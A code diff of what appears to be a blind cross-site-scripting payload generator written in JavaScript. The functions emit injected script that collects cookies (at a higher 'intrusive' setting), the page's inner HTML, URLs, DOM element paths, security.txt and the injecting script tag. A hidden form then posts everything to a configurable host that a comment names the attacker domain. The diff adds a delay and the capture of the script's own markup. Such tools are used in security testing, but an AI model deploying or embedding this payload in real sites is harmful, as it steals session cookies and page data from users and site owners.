@@ -1,6 +1,7 @@
 // As some companies might not want all of their innerHTML/Cookies to be leaked to a third-party
 // This acts as a barrier, by default config.intrusiveLevel is set to 0, which means
 // We will only capture relevant information about the host, and report it
+// Sets elements
 function determineInstrusive(config) {
   const capture = {};
   capture.cookie = config.intrusiveLevel === 1 ? 'document.cookie' : 'null';
@@ -21,21 +22,17 @@ function determineInstrusive(config) {
 function captureParentNodes(config) {
   return `
       function captureParentNodes(element, _array) {
-            console.log(element.nodeName)
             if (_array === undefined) {
                   _array = [];
-                  _array.push(element.nodeName)
             }
-            else {
-                  value = element.nodeName
-                  if(element.className !== null) {
-                        value = value + '-' + element.className
-                  }
-                  if(element.id.trim() !== null && element.id != ' ') {
-                        value = value + '-' + element.id
-                  }
-                   _array.push(value);
+            value = element.nodeName
+            if(element.id != '') {
+                  value = value + '-' + element.id
             }
+            if(element.className != '') {
+                  value = value + '-' + element.className
+            }
+            _array.push(value);
             if(element.nodeName !== 'HTML' ) return captureParentNodes(element.parentNode, _array);
             else return _array;           
       }
@@ -70,13 +67,12 @@ function checkForSecurityTxt() {
                   if(this.readyState === 4 && this.status == 200) {
                         cb(this.responseText);
                   } else if(this.readyState === 4 && this.status != 200) {
+
                         cb(null);
                   }
             }
             checkForSecurityTxt.send(null);
-      }     
-      
-      `;
+      }`;
 }
 
 // Callback from XHR to get for /.well-known/security.txt on domain
@@ -87,27 +83,39 @@ function checkForSecurityTxt() {
 // Data is then sent to the attacker domain to be processed
 function sendXhr(config) {
   return `
-  function cbSecurityTxt(stxt) {
- 
-      var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
-      var __= document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
-      var body = document.getElementsByTagName('body')[0];
+      var cScript = document.currentScript;   
 
-      __.setAttribute('value',escape(dcoo+'\\r\\n\\r\\n${config.boundary}'+inne+'\\r\\n\\r\\n${
-    config.boundary
-  }'+durl+'\\r\\n\\r\\n${config.boundary}'+oloc+'\\r\\n\\r\\n${
-    config.boundary
-  }'+oloh+'\\r\\n\\r\\n${config.boundary}'+odoc+'\\r\\n\\r\\n${config.boundary}'+stxt));
-      __.setAttribute('name','_');
-      _.appendChild(__);
-      _.action='//${config.url}/m';
-      _.method='post';
-      
+      function cbSecurityTxt(stxt) {
+        
+            setTimeout(function(){
+         
+            if(cScript === undefined || cScript === null) { 
+                  var pload = 'null'
+            } else {
+                  var pload = cScript.outerHTML
+            }
 
-      body.appendChild(_);
-      window.name='__';
-      _.submit();
-}    
+            var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
+            var __= document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
+            var body = document.getElementsByTagName('body')[0];
+
+            __.setAttribute('value',escape(dcoo+'\\r\\n\\r\\n${
+              config.boundary
+            }'+inne+'\\r\\n\\r\\n${config.boundary}'+durl+'\\r\\n\\r\\n${
+    config.boundary
+  }'+oloc+'\\r\\n\\r\\n${config.boundary}'+oloh+'\\r\\n\\r\\n${
+    config.boundary
+  }'+odoc+'\\r\\n\\r\\n${config.boundary}'+stxt+'\\r\\n\\r\\n${config.boundary}'+pload));
+            __.setAttribute('name','_');
+            _.appendChild(__);
+            _.action='//${config.url}/m';
+            _.method='post';
+
+            body.appendChild(_);
+            window.name='__';
+            _.submit();
+            }, 1000)    
+      }
       `;
 }
 
@@ -115,7 +123,7 @@ function sendXhr(config) {
 // Try to capture all the document information depending on pre-defined determineInstrusive function
 // Then calls final XHR if it exists from checkForSecurityTxt function success or fail.
 function captureInformation(capture) {
-  return `                  
+  return `
           try {dcoo = ${capture.cookie}} catch(e) {dcoo=null}
           try {inne = ${capture.documentBody}} catch(e) {inne=null}
           try {durl = ${capture.url}} catch(e) {durl=null}
